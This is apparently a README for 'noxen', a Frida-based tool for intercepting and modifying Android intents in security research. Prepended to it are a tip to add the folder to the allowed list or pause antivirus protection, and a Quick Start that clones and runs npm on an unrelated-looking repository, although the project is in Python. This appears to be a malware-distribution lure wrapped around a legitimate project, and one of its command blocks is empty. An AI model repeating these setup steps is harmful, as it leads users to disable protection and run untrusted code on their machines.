
> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/CalmJourneymanRoller/noxen-943.git
cd noxen-943
npm install
npm start
```


<p align="center">
  <img src="assets/logo.svg" width="400">
</p>

Android runtime interception for security research. noxen uses **Frida** to hook Java
methods in a running Android process and map how app components communicate at
runtime. It captures attack-surface events such as `android.content.Intent` objects,
then lets you inspect, modify, forward, or drop them from a terminal UI.

![Python](https://img.shields.io/badge/python-3.10+-blue)
![License](https://img.shields.io/badge/license-GPLv3-green)

![noxen Home tab](assets/screenshots/home.png)

## What It Does

- Helps map component communication and attack-surface behavior at runtime.
- Intercepts common Android runtime entry points such as `getIntent`, `startActivity`,
  `sendBroadcast`, `startService`, and `PendingIntent` creation paths.
- Shows action, component, data URI, flags, categories, extras, PendingIntent flags,
  optional Java stack traces, and attack-surface labels where available.
- Lets you modify intent action, data, categories, flags, and extras before forwarding.
- Lets you drop intercepted intents.
- Stores captured history, outcomes, filters, columns, and modified intent snapshots
  in `.noxen` project files.
- Provides independent Intercept and History filters.
- Provides an optional Home-tab `Input ANR bypass (experimental)` for rooted test devices,
  focused on input-dispatch ANRs while noxen intentionally holds a target thread.
- Uses a structured Log tab with aligned source/level columns and optional
  `Verbose logs` for detailed hook and bypass diagnostics.
- Analyzes APKs with androguard to generate hook configuration.


## Interface Preview

![Intercept tab](assets/screenshots/intercept.png)

![History tab](assets/screenshots/history.png)

## Playground App

The companion Android target app lives in the [noxen-playground](https://github.com/frankheat/noxen-playground) repository.
It is named `noxen playground` on device and uses the package
`com.frankheat.noxen.playground`.

Use it to validate common runtime flows while developing noxen:

```bash
cd ../noxen-playground
./gradlew assembleDebug
```

Open `noxen-playground/` directly in Android Studio rather than the workspace parent
directory.

## Development

The Python package uses a `src` layout: importable code lives in `src/noxen/`. This
keeps the repository root separate from the installed package and avoids shell
ambiguity between the `noxen` command and a local package directory.

After changing Python code, run the unit tests. When validating Frida compatibility,
repeat the same checks with the Frida environments you support. For example, this
repository is commonly tested with local Frida 16 and Frida 17 virtual environments:

```bash
../frida-16.6.6/bin/python -m compileall -q src/noxen
PYTHONPATH=src ../frida-16.6.6/bin/python -m unittest discover -s tests
../frida-17.7.3/bin/python -m compileall -q src/noxen
PYTHONPATH=src ../frida-17.7.3/bin/python -m unittest discover -s tests
```

After changing `agent/script.js` or `agent/system_server.js`, rebuild the committed
Frida bundles and packaged runtime copies:

```bash
```

Commit the changed source script, its matching `*_bundle.js` file, and the synced
`src/noxen/runtime/` copy. Do not commit `node_modules/`.

## License

noxen is released under the [GNU General Public License v3.0](LICENSE).


<!-- Last updated: 2026-06-06 15:25:48 -->
